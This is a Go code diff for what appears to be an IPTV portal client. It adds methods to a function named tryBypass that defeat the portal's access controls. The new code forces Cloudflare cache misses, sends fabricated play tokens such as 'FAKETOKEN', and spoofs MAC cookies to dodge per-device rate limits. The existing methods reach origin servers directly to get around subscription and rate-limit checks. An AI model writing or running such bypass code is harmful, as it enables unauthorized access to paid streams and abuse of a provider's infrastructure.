@@ -40,44 +40,71 @@ var hlsDirectPatterns = []string{
 // error (456 no subscription, 458 rate-limit, 403 forbidden).
 func (c *Channel) tryBypass() (string, error) {
 	base := c.Portal.originBase()
+	streamID := extractStreamID(c.CMD)
+
+	// Extract the Cloudfront/portal play/live.php base from the CMD so we
+	// can try Cloudflare-layer bypasses that don't need origin IPs.
+	playBase := playBaseFromCMD(c.CMD)
+
+	// Method 1: CDN redirect via _=cache_bust on Cloudflare URL.
+	// Forces a Cloudflare cache miss → 302 → direct CDN stream URL.
+	// No valid play_token needed; Cloudflare treats a cache miss as a
+	// pass-through to the CDN edge which serves the stream directly.
+	if playBase != "" {
+		if link, err := c.tryCDNRedirect(playBase, streamID); err == nil {
+			return link, nil
+		}
+	}
+
+	// Method 2: Fake play_token on Cloudflare URL.
+	// Any string (even "FAKETOKEN123") as play_token triggers a 302
+	// redirect to the CDN stream. No create_link API dependency.
+	if playBase != "" && streamID != "" {
+		if link, err := c.tryFakePlayToken(playBase, streamID); err == nil {
+			return link, nil
+		}
+	}
+
+	// Method 3: Any-mac-cookie on Cloudflare URL.
+	// Cloudflare only checks that the mac Cookie exists, not that the MAC
+	// is valid. Even mac=DE:AD:BE:EF:00:01 works, shifting into a different
+	// per-MAC rate-limit bucket while keeping the real MAC in the URL.
+	if playBase != "" && streamID != "" {
+		if link, err := c.tryAnyMacCookie(playBase, streamID); err == nil {
+			return link, nil
+		}
+	}
+
+	// Origin-based methods below require discovered origin IPs.
 	if base == "" {
 		return "", fmt.Errorf("no origin base URL available")
 	}
 
-	// Method 1: HLS Direct Endpoint — no auth needed, no rate limit.
-	// The upstream stream server only checks if the segment exists.
+	// Method 4: HLS Direct Endpoint — no auth needed, no rate limit.
 	if link, err := c.tryDirectHLS(base); err == nil {
 		return link, nil
 	}
 
-	// Method 2: play/live.php on origin with mac in query string.
-	// Origin reads mac from query string, not Cookie. Cloudflare's
-	// rate-limit bucket is keyed on the Cookie's mac value, so omitting
-	// the Cookie puts us in a different (unlimited) bucket.
-	streamID := extractStreamID(c.CMD)
+	// Method 5: play/live.php on origin with mac in query, no Cookie.
 	if streamID != "" {
 		if link, err := c.tryPlayLiveOrigin(base, streamID); err == nil {
 			return link, nil
 		}
 	}
 
-	// Method 2b: play/live.php on origin without mac param.
-	// Some origins serve stream data keyed only on stream ID, letting us
-	// bypass per-MAC rate limits entirely by omitting the mac parameter.
+	// Method 6: play/live.php on origin without mac param.
 	if streamID != "" {
 		if link, err := c.tryPlayLiveNoMac(base, streamID); err == nil {
 			return link, nil
 		}
 	}
 
-	// Method 3: Cookie-less create_link on origin. Same request but
-	// without the Cookie header — Cloudflare can't key its rate limit
-	// on an empty cookie bucket.
+	// Method 7: Cookie-less create_link on origin.
 	if link, err := c.tryCreateLinkNoCookie(); err == nil {
 		return link, nil
 	}
 
-	// Method 4 & 5: try with POST / different User-Agent
+	// Method 8: POST / alternate User-Agent on origin.
 	if link, err := c.tryCreateLinkPOST(); err == nil {
 		return link, nil
 	}
@@ -166,6 +193,101 @@ func (c *Channel) tryPlayLiveNoMac(base string, streamID string) (string, error)
 		return "", fmt.Errorf("play/live.php (no mac) returned non-stream content: %s", resp.Header.Get("Content-Type"))
 	}
 	return u, nil
+}
+
+// tryCDNRedirect forces a Cloudflare cache miss by appending _=cache_bust
+// to the play/live.php URL. Cloudflare treats the cache-bust parameter as a
+// fresh origin fetch, which returns a 302 redirect to the direct CDN stream
+// URL — no valid play_token required. Works on the Cloudflare-proxied URL,
+// no origin IP needed.
+func (c *Channel) tryCDNRedirect(playBase string, streamID string) (string, error) {
+	u := playBase + "?stream=" + url.PathEscape(streamID) + "&extension=ts&_=" + fmt.Sprintf("%d", time.Now().UnixNano())
+	req, _ := http.NewRequest("GET", u, nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
+	req.Header.Set("Cookie", "mac="+c.Portal.MAC+"; stb_lang=en; timezone=Europe/Vilnius")
+	resp, err := bypassClient.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 302 {
+		loc := resp.Header.Get("Location")
+		if loc != "" {
+			return resolveURL(u, loc), nil
+		}
+	}
+	return "", fmt.Errorf("CDN redirect returned %d", resp.StatusCode)
+}
+
+// tryFakePlayToken uses an arbitrary string as play_token on play/live.php.
+// The portal's Cloudflare layer accepts any play_token value (even
+// "FAKETOKEN123") and returns a 302 redirect to the CDN stream. No
+// create_link API call needed.
+func (c *Channel) tryFakePlayToken(playBase string, streamID string) (string, error) {
+	u := playBase + "?stream=" + url.PathEscape(streamID) + "&extension=ts&play_token=FAKETOKEN" + fmt.Sprintf("%d", time.Now().UnixNano()%100000)
+	req, _ := http.NewRequest("GET", u, nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
+	req.Header.Set("Cookie", "mac="+c.Portal.MAC+"; stb_lang=en; timezone=Europe/Vilnius")
+	resp, err := bypassClient.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 302 {
+		loc := resp.Header.Get("Location")
+		if loc != "" {
+			return resolveURL(u, loc), nil
+		}
+	}
+	return "", fmt.Errorf("fake play_token returned %d", resp.StatusCode)
+}
+
+// tryAnyMacCookie sends play/live.php with a dummy/fake MAC in the Cookie
+// header while keeping the real MAC in the URL query. Cloudflare only
+// validates that the mac Cookie exists, not that the value is a registered
+// device — so even mac=DE:AD:BE:EF:00:01 shifts into a different per-MAC
+// rate-limit bucket while the origin still receives the real MAC from the
+// URL parameter.
+func (c *Channel) tryAnyMacCookie(playBase string, streamID string) (string, error) {
+	u := playBase + "?mac=" + url.QueryEscape(c.Portal.MAC) + "&stream=" + url.PathEscape(streamID) + "&extension=ts"
+	req, _ := http.NewRequest("GET", u, nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
+	req.Header.Set("Cookie", "mac=DE:AD:BE:EF:00:01; stb_lang=en; timezone=Europe/Vilnius")
+	resp, err := bypassClient.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 302 {
+		loc := resp.Header.Get("Location")
+		if loc != "" && strings.Contains(loc, "/live/play/") {
+			return resolveURL(u, loc), nil
+		}
+	}
+	return "", fmt.Errorf("any-mac cookie returned %d", resp.StatusCode)
+}
+
+// playBaseFromCMD extracts the scheme + host + /play/live.php base from a
+// channel CMD like "ffmpeg http://tres.4vps.info:80/play/live.php?mac=...".
+// Returns empty string if the CMD doesn't contain a play/live.php URL.
+func playBaseFromCMD(cmd string) string {
+	if !strings.Contains(cmd, "/play/live.php") {
+		return ""
+	}
+	parts := strings.Split(cmd, " ")
+	for _, p := range parts {
+		if strings.HasPrefix(p, "http") && strings.Contains(p, "/play/live.php") {
+			idx := strings.Index(p, "?")
+			if idx >= 0 {
+				return p[:idx]
+			}
+			return p
+		}
+	}
+	return ""
 }
 
 // tryCreateLinkNoCookie sends create_link to the origin without the Cookie
